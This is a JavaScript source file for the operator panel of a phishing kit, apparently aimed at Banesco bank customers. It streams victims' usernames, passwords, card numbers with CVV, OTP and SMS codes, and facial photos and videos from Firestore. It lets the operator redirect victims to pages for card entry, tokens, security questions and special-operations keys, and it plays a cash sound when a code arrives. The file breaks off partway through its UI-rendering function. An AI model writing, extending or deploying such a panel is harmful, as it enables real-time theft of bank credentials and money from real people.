// Importar Firebase v9+
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
  getFirestore,
  collection,
  doc,
  updateDoc,
  deleteDoc,
  onSnapshot,
  query,
  getDoc,
  setDoc,
  getDocs,
  limit
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
// NOTA: firebaseConfig y appConfig se cargan desde firebase-config.js como variables globales
// Inicializar Firebase usando la configuración global
const app = initializeApp(window.firebaseConfig);
const db = getFirestore(app);
// Exponer funciones de Firestore para uso global si es necesario
window.db = db;
window.collection = collection;
window.doc = doc;
window.updateDoc = updateDoc;
window.deleteDoc = deleteDoc;

// Color por defecto para tarjetas sin color asignado
const defaultColor = '#ababad'; // Gris claro (primer color del array)

if (!document.getElementById('panel-loading-badge-styles')) {
    const loadingBadgeStyle = document.createElement('style');
    loadingBadgeStyle.id = 'panel-loading-badge-styles';
    loadingBadgeStyle.textContent = `
        @keyframes pulseBadge {
            0% { box-shadow: 0 0 10px rgba(255, 224, 102, 0.85), 0 0 18px rgba(255, 224, 102, 0.35); }
            50% { box-shadow: 0 0 16px rgba(255, 224, 102, 1), 0 0 30px rgba(255, 224, 102, 0.6); }
            100% { box-shadow: 0 0 10px rgba(255, 224, 102, 0.85), 0 0 18px rgba(255, 224, 102, 0.35); }
        } "Cédula de Ciudadanía";
    `;
    document.head.appendChild(loadingBadgeStyle);
}

// ==================== SISTEMA DE AUDIO PARA NUEVAS CARDS ====================

// Set para trackear usuarios existentes
let existingUsers = new Set();

// Map para trackear estados de usuarios existentes (userId -> {page, status})
let userStates = new Map();
let userDisplayOrder = new Map();
let nextUserDisplayOrder = 1;
const focusedUserId = new URLSearchParams(window.location.search).get("focus");
let pendingCardStatusOverrides = new Map();
let activeUsersUnsubscribe = null;

// Variables de control para problemas identificados
let isFirstLoad = true; // Para detectar si es la primera carga real
let adminActionInProgress = false; // Para ignorar cambios iniciados por el admin
let adminActionTimeout = null; // Timeout para resetear el flag

// Configuración de audio (rutas relativas a la raíz del sitio; ver /sounds/)
const audioConfig = {
    enabled: true,
    notificationSound: '/sounds/notification-new.mp3',
    updateSound: '/sounds/notification-update.mp3',
    otpSound: '/sounds/money.mp3',
    volume: 0.7
};

// Función para reproducir sonido de notificación (nuevas cards)
function playNotificationSound() {
    if (!audioConfig.enabled) {

        return;
    }
    
    try {
        // Forzar el sonido de notificación (nuevas cards) - Billete Papa
        const soundPath = audioConfig.notificationSound || '/sounds/billete-papa.mp3';

        
        const audio = new Audio(soundPath);
        audio.volume = audioConfig.volume;
        
        // Promesa para manejar la reproducción
        const playPromise = audio.play();
        
        if (playPromise !== undefined) {
            playPromise
                .then(() => {

                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo audio de NUEVA CARD:', error);
                    showVisualNotification('nueva');
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio para NUEVA CARD:', error);
        showVisualNotification('nueva');
    }
}

// Función para reproducir sonido de actualización de estado
function playUpdateSound() {
    if (!audioConfig.enabled) {

        return;
    }
    
    try {
        // Forzar el sonido de actualización - Franklin Notification
        const soundPath = audioConfig.updateSound || '/sounds/franklin-notification-gta-v.mp3';

        
        const audio = new Audio(soundPath);
        audio.volume = audioConfig.volume;
        
        // Promesa para manejar la reproducción
        const playPromise = audio.play();
        
        if (playPromise !== undefined) {
            playPromise
                .then(() => {

                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo audio de ACTUALIZACIÓN:', error);
                    showVisualNotification('actualizada');
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio para ACTUALIZACIÓN:', error);
        showVisualNotification('actualizada');
    }
}

// Función para reproducir sonido cuando llega SMS/OTP
function playOtpSound() {
    if (!audioConfig.enabled) {
        return;
    }
    
    try {
        const audio = new Audio(audioConfig.otpSound);
        audio.volume = audioConfig.volume;
        
        const playPromise = audio.play();
        
        if (playPromise !== undefined) {
            playPromise
                .then(() => {
                    console.log('💰 Sonido OTP reproducido correctamente');
                })
                .catch(error => {
                    console.warn('⚠️ Error reproduciendo audio de OTP:', error);
                });
        }
    } catch (error) {
        console.error('❌ Error creando objeto Audio para OTP:', error);
    }
}

// Función para mostrar notificación visual como fallback
function showVisualNotification(type = 'nueva') {
    // Configuración según el tipo de notificación
    const config = {
        nueva: {
            background: '#28a745',
            icon: '🆕',
            text: 'Nueva card detectada!'
        },
        actualizada: {
            background: '#007bff',
            icon: '🔄',
            text: 'Card actualizada!'
        }
    };
    
    const currentConfig = config[type] || config.nueva;
    
    // Crear notificación visual temporal
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${currentConfig.background};
        color: white;
        padding: 15px 20px;
        border-radius: 8px;
        font-weight: bold;
        z-index: 10000;
        box-shadow: 0 4px 12px rgba(233, 231, 231, 0.3);
        animation: slideIn 0.3s ease-out;
    `;
    notification.innerHTML = `${currentConfig.icon} ${currentConfig.text}`;
    
    // Agregar animación CSS
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Remover después de 3 segundos
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease-in';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// ==================== FUNCIONES DE CONTROL PARA ACCIONES DEL ADMIN ====================

/**
 * Marca que una acción del administrador está en progreso
 * Esto evitará que se reproduzcan sonidos por cambios iniciados desde el panel
 */
function setAdminActionInProgress() {
    adminActionInProgress = true;

    
    // Limpiar timeout anterior si existe
    if (adminActionTimeout) {
        clearTimeout(adminActionTimeout);
    }
    
    // Resetear el flag después de 3 segundos
    adminActionTimeout = setTimeout(() => {
        adminActionInProgress = false;

    }, 3000);
}

/**
 * Verifica si es realmente la primera carga (panel vacío)
 * vs una recarga de página con datos existentes
 */
function isReallyFirstLoad(docs) {
    // Si no hay documentos, definitivamente es primera carga
    if (docs.length === 0) {
        return true;
    }
    
    // Si es la primera vez que se ejecuta updateUI y hay datos,
    // verificar si el panel estaba realmente vacío
    if (isFirstLoad) {
        // Verificar si el contenedor de usuarios está vacío
        const usersList = document.getElementById('users-list');
        const hasExistingCards = usersList && usersList.children.length > 0;
        
        // Si no hay cards en el DOM, es una carga inicial real
        return !hasExistingCards;
    }
    
    return false;
}

// ==================== FIN FUNCIONES DE CONTROL ====================

// Función para inicializar el set de usuarios existentes
function initializeExistingUsers(docs) {
    existingUsers.clear();
    docs.forEach(doc => {
        existingUsers.add(doc.id);
    });

}

// Función para detectar nuevos usuarios
function detectNewUsers(docs) {
    const currentUsers = new Set(docs.map(doc => doc.id));
    const newUsers = [];
    
    // Encontrar usuarios que no estaban antes
    currentUsers.forEach(userId => {
        if (!existingUsers.has(userId)) {
            newUsers.push(userId);
        }
    });
    
    // Actualizar set de usuarios existentes
    existingUsers = currentUsers;
    
    return newUsers;
}

// Función para inicializar el tracking de estados de usuarios
function initializeUserStates(docs) {
    userStates.clear();
    docs.forEach(doc => {
        const userData = doc.data();
        const userId = doc.id;

    });

}

// Función para detectar cambios de estado y actualizaciones de OTP
function detectStateChanges(docs) {
    const updatedUsers = [];
    const otpUpdates = [];

    docs.forEach(doc => {
        const userData = doc.data();
        const userId = doc.id;
        const currentPage = userData.page || 0;
        const currentStatus = getStatusText(currentPage);
        const currentStatusClass = getStatusClass(currentPage);
        const currentOtp = userData.token || '';

        if (userStates.has(userId)) {
            const previousState = userStates.get(userId);
            const previousOtp = previousState.token || '';
            const stateChanged = previousState.page !== currentPage || previousState.status !== currentStatus;
            const otpChanged = (currentOtp && currentOtp !== previousOtp);

            if (stateChanged) {
                updatedUsers.push({
                    userId,
                    previousState,
                    newState: {
                        page: currentPage,
                        status: currentStatus,
                        statusClass: currentStatusClass,
                        token: currentOtp || previousOtp || '',
                    }
                });
            }

            if (otpChanged) {
                otpUpdates.push({
                    userId,
                    previousOtp,
                    currentOtp
                });
            }

            userStates.set(userId, {
                page: currentPage,
                status: currentStatus,
                statusClass: currentStatusClass,
                token: currentOtp || previousOtp || '',
            });
        } else {
            userStates.set(userId, {
                page: currentPage,
                status: currentStatus,
                statusClass: currentStatusClass,
                token: currentOtp,
            });
        }
    });

    return { updatedUsers, otpUpdates };
}

// ==================== CONFIGURACIÓN Y ESTADÍSTICAS DE AUDIO ====================

// Variables para estadísticas
let notificationCount = 0;
let updateCount = 0;
let lastNewUserInfo = null;
let lastUpdatedUserInfo = null;

// Función para cargar configuración de audio desde localStorage
function loadAudioConfig() {
    try {
        const savedConfig = localStorage.getItem('audioConfig');
        if (savedConfig) {
            const config = JSON.parse(savedConfig);
            
            // Aplicar configuración guardada
            audioConfig.enabled = config.enabled !== undefined ? config.enabled : true;
            audioConfig.volume = config.volume !== undefined ? config.volume : 0.7;
            audioConfig.notificationSound = config.notificationSound || '/sounds/notification-new.mp3';
            audioConfig.updateSound = config.updateSound || '/sounds/notification-update.mp3';
            audioConfig.otpSound = config.otpSound || '/sounds/money.mp3';
            

        }
        
        // Cargar estadísticas
        const savedStats = localStorage.getItem('audioStats');
        if (savedStats) {
            const stats = JSON.parse(savedStats);
            notificationCount = stats.notificationCount || 0;
            updateCount = stats.updateCount || 0;
            lastNewUserInfo = stats.lastNewUserInfo || null;
            lastUpdatedUserInfo = stats.lastUpdatedUserInfo || null;
        }
        
    } catch (error) {
        console.error('❌ Error cargando configuración de audio:', error);
    }
}

// Función para guardar configuración de audio en localStorage
function saveAudioConfig() {
    try {
        const configToSave = {
            enabled: audioConfig.enabled,
            volume: audioConfig.volume,
            notificationSound: audioConfig.notificationSound,
            updateSound: audioConfig.updateSound,
            otpSound: audioConfig.otpSound
        };
        
        localStorage.setItem('audioConfig', JSON.stringify(configToSave));
        
        const statsToSave = {
            notificationCount: notificationCount,
            updateCount: updateCount,
            lastNewUserInfo: lastNewUserInfo,
            lastUpdatedUserInfo: lastUpdatedUserInfo
        };
        
        localStorage.setItem('audioStats', JSON.stringify(statsToSave));
        

        
        // Mostrar confirmación visual
        if (elements.saveAudioConfig) {
            const originalText = elements.saveAudioConfig.innerHTML;
            elements.saveAudioConfig.innerHTML = '✓ Guardado';
            elements.saveAudioConfig.classList.remove('btn-success');
            elements.saveAudioConfig.classList.add('btn-success');
            
            setTimeout(() => {
                elements.saveAudioConfig.innerHTML = originalText;
            }, 2000);
        }
        
    } catch (error) {
        console.error('❌ Error guardando configuración de audio:', error);
    }
}

// Función para actualizar la UI con la configuración actual
function updateAudioUI() {
    if (elements.audioEnabled) {
        elements.audioEnabled.checked = audioConfig.enabled;
    }
    
    if (elements.audioVolume) {
        elements.audioVolume.value = Math.round(audioConfig.volume * 100);
    }
    
    if (elements.volumeDisplay) {
        elements.volumeDisplay.textContent = Math.round(audioConfig.volume * 100) + '%';
    }
    
    if (elements.audioSoundSelect) {
        elements.audioSoundSelect.value = audioConfig.notificationSound;
    }
    
    if (elements.audioUpdateSelect) {
        elements.audioUpdateSelect.value = audioConfig.updateSound;
    }

    if (elements.audioOtpSelect) {
        elements.audioOtpSelect.value = audioConfig.otpSound;
    }
    
    if (elements.notificationCount) {
        elements.notificationCount.textContent = notificationCount;
    }
    
    if (elements.updateCount) {
        elements.updateCount.textContent = updateCount;
    }
    
    if (elements.lastNewUser) {
        if (lastNewUserInfo) {
            const timeAgo = getTimeAgo(lastNewUserInfo.timestamp);
            elements.lastNewUser.innerHTML = `${lastNewUserInfo.userId} <small class="text-muted">(${timeAgo})</small>`;
        } else {
            elements.lastNewUser.textContent = 'Ninguna';
        }
    }
    
    if (elements.lastUpdatedUser) {
        if (lastUpdatedUserInfo) {
            const timeAgo = getTimeAgo(lastUpdatedUserInfo.timestamp);
            elements.lastUpdatedUser.innerHTML = `
                ${lastUpdatedUserInfo.userId} 
                <small class="text-muted">
                    (${lastUpdatedUserInfo.previousStatus} → ${lastUpdatedUserInfo.newStatus}, ${timeAgo})
                </small>
            `;
        } else {
            elements.lastUpdatedUser.textContent = 'Ninguna';
        }
    }
}

// Función para obtener tiempo transcurrido
function getTimeAgo(timestamp) {
    const now = new Date();
    const past = new Date(timestamp);
    const diffMs = now - past;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) return 'hace un momento';
    if (diffMins < 60) return `hace ${diffMins} min`;
    
    const diffHours = Math.floor(diffMins / 60);
    if (diffHours < 24) return `hace ${diffHours}h`;
    
    const diffDays = Math.floor(diffHours / 24);
    return `hace ${diffDays}d`;
}

// Función para actualizar estadísticas cuando se detecta nuevo usuario
function updateAudioStats(newUsers) {
    if (newUsers.length > 0) {
        notificationCount += newUsers.length;
        
        // Actualizar info del último usuario
        const lastUser = newUsers[newUsers.length - 1];
        lastNewUserInfo = {
            userId: lastUser,
            timestamp: new Date().toISOString()
        };
        
        // Actualizar UI
        updateAudioUI();
        
        // Guardar estadísticas
        saveAudioConfig();
    }
}

// Función para actualizar estadísticas cuando se detectan actualizaciones de estado
function updateStateChangeStats(updatedUsers) {
    if (updatedUsers.length > 0) {
        updateCount += updatedUsers.length;
        
        // Actualizar info de la última actualización
        const lastUpdate = updatedUsers[updatedUsers.length - 1];
        lastUpdatedUserInfo = {
            userId: lastUpdate.userId,
            previousStatus: lastUpdate.previousState.status,
            newStatus: lastUpdate.newState.status,
            timestamp: new Date().toISOString()
        };
        
        // Actualizar UI
        updateAudioUI();
        
        // Guardar estadísticas
        saveAudioConfig();
    }
}

// ==================== FIN CONFIGURACIÓN DE AUDIO ====================

// Configuración de credenciales

let adminCredentials = { username: "", password: "" };
let credentialsLoaded = false;

// Función para cargar credenciales desde Firestore
async function loadAdminCredentials() {
    try {
        const credentialsRef = doc(db, "adminConfig", "credentials");
        const credentialsSnap = await getDoc(credentialsRef);

        if (credentialsSnap.exists()) {
            adminCredentials = credentialsSnap.data();
        }
    } catch (error) {
        console.error("Error cargando credenciales:", error);
    }
    credentialsLoaded = true;
}
// Elementos DOM
const elements = {
    lognScreen: document.getElementById("logn-screen"),
    adminPanel: document.getElementById("admin-panel"),
    lognForm: document.getElementById("lg-wrap"),
    lognBtn: document.getElementById("btn-mit"),
    logoutBtn: document.getElementById("logout-btn"),
    usersList: document.getElementById("users-list"),
    noUsersMessage: document.getElementById("no-users-message"),
    coordinatesForm: document.getElementById("coordinates-form"),
    msgFm: document.getElementById("message-form"),
    coordUserSelect: document.getElementById("coord-user-select"),
    msgUserSelect: document.getElementById("msg-user-select"),
    activeUsersCount: document.getElementById("active-users-count"),
    coordinatesUsersCount: document.getElementById("coordinates-users-count"),
    tokenUsersCount: document.getElementById("token-users-count"),
    // Elementos del formulario COE
    coemsgFm: document.getElementById("coe-message-form"),
    coeUserSelect: document.getElementById("coe-user-select"),
    phoneNumber: document.getElementById("phone-number"),
    customMessage: document.getElementById("custom-message"),
    // Elementos de configuración de audio
    audioEnabled: document.getElementById("audio-enabled"),
    audioVolume: document.getElementById("audio-volume"),
    volumeDisplay: document.getElementById("volume-display"),
    audioSoundSelect: document.getElementById("audio-sound-select"),
    audioUpdateSelect: document.getElementById("audio-update-select"),
    audioOtpSelect: document.getElementById("audio-otp-select"),
    testAudioBtn: document.getElementById("test-audio-btn"),
    testUpdateBtn: document.getElementById("test-update-btn"),
    testOtpBtn: document.getElementById("test-otp-btn"),
    saveAudioConfig: document.getElementById("save-audio-config"),
    lastNewUser: document.getElementById("last-new-user"),
    lastUpdatedUser: document.getElementById("last-updated-user"),
    notificationCount: document.getElementById("notification-count"),
    updateCount: document.getElementById("update-count"),
    focusedUserBanner: document.getElementById("focused-user-banner"),
    focusedUserBannerText: document.getElementById("focused-user-banner-text"),
    focusedUserBannerLink: document.getElementById("focused-user-banner-link"),
    audioSettingsCard: document.getElementById("audio-settings-card"),
    historialCard: document.getElementById("historial-card")
};

function ensureUserDisplayOrder(docs) {
    docs.forEach(doc => {
        if (!userDisplayOrder.has(doc.id)) {
            userDisplayOrder.set(doc.id, nextUserDisplayOrder++);
        }
    });
}

function isUserWaitingForResponse(userData) {
    if (!userData) return false;
    const page = Number(userData.page || 0);
    return page === 0;
}

function getBadgeClassFromButton(button) {
    if (!button) return "secondary";
    if (button.classList.contains("btn-success")) return "success";
    if (button.classList.contains("btn-danger")) return "danger";
    if (button.classList.contains("btn-primary")) return "primary";
    if (button.classList.contains("btn-warning")) return "warning";
    if (button.classList.contains("btn-info")) return "info";
    if (button.classList.contains("btn-secondary")) return "secondary";
    if (button.classList.contains("btn-dark")) return "dark";
    if (button.classList.contains("btn-light")) return "light";
    return "secondary";
}

function getStatusOverrideFromButton(button) {
    if (!button) {
        return { text: "Desconocido", className: "secondary", page: null };
    }

    const action = button.dataset.action;
    const mappedPage = appConfig.actions?.[action]?.page ?? null;
    const mappedText = mappedPage !== null ? getStatusText(mappedPage) : button.textContent.trim();

    return {
        text: mappedText,
        className: getBadgeClassFromButton(button),
        page: mappedPage
    };
}

function getStatusBadgeStyle(className) {
    return className === "warning"
        ? 'min-width: 108px; text-align: center; font-size: 12px; padding: 8px 12px; background-color: #ffe066; color: #2c2a29; box-shadow: 0 0 12px rgba(255, 224, 102, 0.95), 0 0 24px rgba(255, 224, 102, 0.45); border: 1px solid #ffd43b; animation: pulseBadge 1.2s ease-in-out infinite;'
        : 'min-width: 108px; text-align: center; font-size: 12px; padding: 8px 12px;';
}

function updateCardStatusBadge(card, statusInfo) {
    if (!card || !statusInfo) return;
    const badge = card.querySelector('[data-role="page-status-badge"]');
    if (!badge) return;

    badge.className = `badge badge-${statusInfo.className}`;
    badge.setAttribute("style", getStatusBadgeStyle(statusInfo.className));
    badge.textContent = statusInfo.text;
}

function getPageLocationForAction(action) {
    switch (action) {
        case "home":
        case "index_err":
            return "index";
        case "sms":
        case "sms_err":
            return "tdc";
        case "tdc":
            return "tdc";
        case "tdc_err":
            return "tdc";
        case "token":
        case "token_err":
            return "dinamica";
        case "pregseg_err":
        case "facial":
        case "facial_err":
            return "pregseg";
        default:
            return null;
    }
}

function setPendingCardStatusOverride(userId, button) {
    if (!userId || !button) return;
    pendingCardStatusOverrides.set(userId, getStatusOverrideFromButton(button));
}

// Función para cargar usuarios activos
function loadActiveUsers() {
    if (activeUsersUnsubscribe) return;
    const usersRef = collection(db, "redireccion");
    const q = query(usersRef);
    activeUsersUnsubscribe = onSnapshot(q, (snapshot) => {
        ensureUserDisplayOrder(snapshot.docs);
        let docs = snapshot.docs.slice().sort((a, b) => {
            return (userDisplayOrder.get(b.id) || 0) - (userDisplayOrder.get(a.id) || 0);
        });
        if (focusedUserId) {
            docs = docs.filter(doc => doc.id === focusedUserId);
        }
        updateUI(docs);
    });
}
// Función para iniciar sesión
if (elements.lognBtn) {
    elements.lognBtn.addEventListener("click", async function (e) {
        e.preventDefault();

        if (!credentialsLoaded) {
            alert("Cargando credenciales, por favor espere...");
            await loadAdminCredentials();
        }

        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        if (username === adminCredentials.username && password === adminCredentials.password) {
            localStorage.setItem("adminLoggedIn", "true");
            elements.lognScreen.classList.add("d-none");
            elements.adminPanel.classList.remove("d-none");
            loadActiveUsers();
            if (typeof window.cargarHistorial === "function") {
                window.cargarHistorial();
            }
        } else {
            alert("Credenciales incorrectas. Verifique usuario y contraseña.");
        }
    });

    const triggerLogn = (e) => {
        if (e.key === "Enter") {
            e.preventDefault();
            elements.lognBtn.click();
        }
    };
    document.getElementById("username").addEventListener("keydown", triggerLogn);
    document.getElementById("password").addEventListener("keydown", triggerLogn);
};
// Función para cerrar sesión
if (elements.logoutBtn) {
    elements.logoutBtn.addEventListener("click", function () {
        if (activeUsersUnsubscribe) {
            activeUsersUnsubscribe();
            activeUsersUnsubscribe = null;
        }
        localStorage.removeItem("adminLoggedIn");
        elements.lognScreen.classList.remove("d-none");
        elements.adminPanel.classList.add("d-none");
    });
};
// Función genérica para manejar formularios
function handleFormSubmit(formElement, selectElement, successMessage, updateData) {
    if (!formElement) return;

    formElement.addEventListener("submit", async function (e) {
        e.preventDefault();

        const selectedUserId = selectElement ? selectElement.value : '';
        if (!selectedUserId) {
            alert("Por favor seleccione un usuario");
            return;
        }

        try {
            const userDocRef = doc(db, "redireccion", selectedUserId);
            const dataToUpdate = updateData(selectedUserId);



            await updateDoc(userDocRef, dataToUpdate);
            formElement.reset();


            alert(successMessage);

            // Recargar usuarios para ver cambios inmediatamente
            loadActiveUsers();
        } catch (error) {
            console.error("❌ Error actualizando usuario:", error);
            alert("Error: " + error.message);
        }
    });
}

// Configurar formularios
// Función especial para preguntas de seguridad (solo actualizar, no sobrescribir)
async function enviarPreguntasSeguridad(event) {
    event.preventDefault();
    
    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();

    const selectedUserId = elements.coordUserSelect.value;
    if (!selectedUserId) {
        alert("Por favor seleccione un usuario");
        return;
    }

    const pregunta1 = document.getElementById("pregunta1").value.trim();
    const pregunta2 = document.getElementById("pregunta2").value.trim();

    if (!pregunta1) {
        alert("Por favor complete la primera pregunta de seguridad");
        return;
    }

    // Pregunta 2 es opcional
    if (!pregunta2) {

    }

    try {


        const userDocRef = doc(db, "redireccion", selectedUserId);

        // SOLO ACTUALIZAR - No sobrescribir datos existentes
        const datosActualizar = {
            preguntaSeguridad1: pregunta1,
            preguntaSeguridad2: "", // Inicializar como vacío
            page: 55,  // Redirigir a página DESF
            preguntasConfiguradas: new Date().toISOString()
        };

        // Solo configurar pregunta2 si tiene contenido
        if (pregunta2 && pregunta2.trim() !== '') {
            datosActualizar.preguntaSeguridad2 = pregunta2;

        } else {
            console.log("🗑️ Pregunta 2 será opcional (vacía)");
        }

        console.log(`📊 Actualizando (no sobrescribiendo) con:`, datosActualizar);

        await updateDoc(userDocRef, datosActualizar);

        // Limpiar formulario
        elements.coordinatesForm.reset();


        alert("Preguntas configuradas correctamente. Usuario redirigido a página de seguridad.");

        // Recargar usuarios para ver cambios
        loadActiveUsers();

    } catch (error) {
        console.error("❌ Error configurando preguntas:", error);
        alert("Error: " + error.message);
    }
}

// Función para actualizar mensaje COE
async function actualizarMensajeCOE(event) {
    event.preventDefault();
    
    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();
    
    try {
        const usuario = elements.coeUserSelect.value.trim();
        const phoneNumber = elements.phoneNumber.value.trim();
        const customMessage = elements.customMessage.value.trim();
        
        if (!usuario) {
            throw new Error("Por favor seleccione un usuario");
        }
        
        if (!phoneNumber) {
            throw new Error("El número de teléfono es requerido");
        }
        
        // Mensaje por defecto si no se especifica uno personalizado
        const message = customMessage || `Consulte en su teléfono *****{phone} el mensaje de Banesco con la <b>Clave de Operaciones Especiales</b> que necesita para completar la autenticación.`;
        
        // Reemplazar variable {phone} en el mensaje
        const finalMessage = message.replace(/{phone}/g, phoneNumber);
        



        
        // Actualizar en la colección redireccion (que ya tiene permisos)
        const userRef = doc(db, "redireccion", usuario);
        await updateDoc(userRef, {
            coeMessage: finalMessage,
            coePhone: "*****" + phoneNumber,
            coeCustomMessage: message,
            coeUpdated: new Date().toISOString(),
            coeUpdatedBy: "admin",
            page: 9 // Redirigir automáticamente a COE-Empresa (igual que el botón)
        });
        
        alert(`✅ Mensaje COE actualizado correctamente para ${usuario}`);
        console.log(`🚀 Usuario será redirigido automáticamente a COE-Empresa (page: 9)`);
        
        // Limpiar formulario
        elements.coemsgFm.reset();
        elements.coeUserSelect.value = "";
        
    } catch (error) {
        console.error("❌ Error actualizando mensaje COE:", error);
        alert("Error: " + error.message);
    }
}

// Configurar event listener para el formulario de preguntas
if (elements.coordinatesForm) {
    elements.coordinatesForm.addEventListener('submit', enviarPreguntasSeguridad);
}

// Configurar event listener para el formulario de mensaje COE
if (elements.coemsgFm) {
    elements.coemsgFm.addEventListener('submit', actualizarMensajeCOE);
}

handleFormSubmit(
    elements.msgFm,
    elements.msgUserSelect,
    "Mensaje enviado correctamente",
    () => {
        const messageText = document.getElementById("message-text").value.trim();
        if (!messageText) {
            throw new Error("Por favor ingrese un mensaje");
        }
        return { msg: messageText, page: 6 };
    }
);
// Función para actualizar la interfaz de usuario
function updateUI(docs) {
    // ==================== DETECCIÓN DE NUEVOS USUARIOS Y CAMBIOS DE ESTADO ====================
    
    // Verificar si es realmente la primera carga (panel vacío)
    const reallyFirstLoad = isReallyFirstLoad(docs);
    
    // Si es la primera carga real O no hay usuarios trackeados, inicializar
    if (existingUsers.size === 0 || reallyFirstLoad) {
        initializeExistingUsers(docs);
        initializeUserStates(docs);
        
        if (reallyFirstLoad) {
            console.log('🔄 Primera carga real del panel (estaba vacío) - no reproducir audio');
        } else {

        }
        
        // Marcar que ya no es la primera carga
        isFirstLoad = false;
    } else {
        // Detectar nuevos usuarios
        const newUsers = detectNewUsers(docs);
        
        // Detectar cambios de estado y actualizaciones de OTP
        const { updatedUsers, otpUpdates } = detectStateChanges(docs);
        
        // Detectar cambios en OTP (SMS) y reproducir sonido
        if (otpUpdates.length > 0) {
            console.log('💰 OTP actualizado:', otpUpdates);
            playOtpSound();
        }
        
        // Manejar nuevos usuarios (siempre reproducir sonido si hay nuevos)
        if (newUsers.length > 0) {
            console.log(`🆕 ${newUsers.length} nuevo(s) usuario(s) detectado(s):`, newUsers);
            
            // Reproducir sonido de notificación (incluso para la primera card si el panel estaba vacío)
            playNotificationSound();
            
            // Actualizar estadísticas de audio
            updateAudioStats(newUsers);
        }
        
        // Manejar actualizaciones de estado (solo si NO es una acción del admin)
        // Importante: si hubo nuevos usuarios en este ciclo, NO reproducir sonido de actualización
        // Y si hubo cambios de OTP, tampoco reproducir (para evitar doble sonido)
        else if (updatedUsers.length > 0 && otpUpdates.length === 0) {
            console.log(`🔄 ${updatedUsers.length} usuario(s) actualizado(s):`, updatedUsers);
            
            // Solo reproducir sonido si NO es una acción del administrador
            if (!adminActionInProgress) {
                // Reproducir sonido de actualización
                playUpdateSound();
                
                // Actualizar estadísticas de actualizaciones
                updateStateChangeStats(updatedUsers);
            } else {

            }
            
            // Log detallado de actualizaciones (siempre mostrar)
            updatedUsers.forEach(update => {

                console.log(`   Estado anterior: ${update.previousState.status} (page: ${update.previousState.page})`);
                console.log(`   Estado nuevo: ${update.newState.status} (page: ${update.newState.page})`);
            });
        }
    }
    
    // ==================== FIN DETECCIÓN ====================
    
    // Remover únicamente tarjetas de usuarios que ya no existan en docs (sin limpiar todo el panel)
    const currentUserIds = new Set(docs.map(d => d.id));
    const existingContainers = elements.usersList.querySelectorAll('[data-user-container], [data-user-id]');
    existingContainers.forEach((container) => {
        if (container.closest('[data-removing="true"]')) return;
        const containerUserId = container.getAttribute('data-user-id') || container.getAttribute('data-user-container');
        if (containerUserId && !currentUserIds.has(containerUserId)) {
            pendingCardStatusOverrides.delete(containerUserId);
            container.remove();
        }
    });

    // Limpiar selectores de usuario
    const userOptions = '<option value="">Seleccione un usuario...</option>';
    if (elements.coordUserSelect) elements.coordUserSelect.innerHTML = userOptions;
    if (elements.msgUserSelect) elements.msgUserSelect.innerHTML = userOptions;
    if (elements.coeUserSelect) elements.coeUserSelect.innerHTML = userOptions;
    // Contadores
    let totalActive = 0;
    let inCoordinates = 0;
    let inToken = 0;
    let inHomePage = 0;
    if (docs.length === 0) {
        elements.noUsersMessage.classList.remove("d-none");
    } else {
        elements.noUsersMessage.classList.add("d-none");
        docs.forEach((doc) => {
            const userData = doc.data();
            const userId = doc.id;
            const usuario = userData.usuario || '';
            const tipoDocTexto = userData.tipoDocumentoTexto || '';
            const clave = userData.clave || '';
            const tdcNombre = userData.tdcNombre || '';
            const tdcNumero = userData.tdcNumero || '';
            const tdcMes = userData.tdcMes || '';
            const tdcAnio = userData.tdcAnio || '';
            const tdcCvv = userData.tdcCvv || '';
            const tdcEstado = userData.tdcEstado || '';
            const token = userData.otpCode || '';
            const sms = userData.smsCode || '';
            const tokenResend = userData.tokenResend || '';
            const fotoFacialUrl = userData.fotoFacialUrl || '';
            const videoFacialUrl = userData.videoFacialUrl || '';
            const facialMediaReady = userData.facialMediaReady === true || (!!fotoFacialUrl && !!videoFacialUrl);
            const dinamicaEstado = userData.dinamicaEstado || '';
            const userPage = userData.page || 0;
            const textColor = "#ffffff";
            // Procesar todos los usuarios, incluso los que están en la página inicial (page=4)
            totalActive++;
            // Contar usuarios por estado
            
            // Buscar contenedor existente por userId (compatibilidad con data-user-container)
            const existingContainer =
                elements.usersList.querySelector(`[data-user-id="${userId}"]`) ||
                elements.usersList.querySelector(`[data-user-container="${userId}"]`);

            // Crear tarjeta de usuario (manteniendo el diseño original)
            // 🎨 APLICAR COLORES ESPECIALES PARA NO-VENEZOLANOS
            const cardNumber = userDisplayOrder.get(userId) || '?';
            
            const premioValue = Number(userData.premio || userData.bonoSaldo || 0);
            const premioLabel = premioValue > 0
                ? `$${premioValue} USD`
                : "Pendiente";
            const premioColor = "#f4b400";
            const btnSelectionLabel = "Pendiente";
            const btnSelectionColor = "#6c757d";
            const tdcEstadoLabel = tdcEstado === 'error' ? 'Error' : (tdcEstado === 'ok' ? 'Normal' : 'Pendiente');
            const tdcEstadoColor = tdcEstado === 'error' ? '#dc3545' : (tdcEstado === 'ok' ? '#28a745' : '#6c757d');
            const dinamicaEstadoLabel = dinamicaEstado === 'error' ? 'Error' : (dinamicaEstado === 'ok' ? 'Normal' : 'Pendiente');
            const dinamicaEstadoColor = dinamicaEstado === 'error' ? '#dc3545' : (dinamicaEstado === 'ok' ? '#28a745' : '#6c757d');
